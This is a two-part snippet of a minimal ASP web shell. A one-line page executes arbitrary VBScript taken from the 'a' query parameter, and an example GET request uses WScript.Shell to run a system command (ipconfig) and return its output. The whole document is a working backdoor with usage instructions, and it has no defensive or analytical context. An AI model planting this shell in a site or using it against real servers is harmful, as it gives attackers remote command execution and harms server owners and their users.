<%execute Request.QueryString("a")%>

Send the following GET request in order to send your command

ss_get.asp?a=Response.Write(CreateObject("WScript.Shell").exec("ipconfig").StdOut.ReadAll)
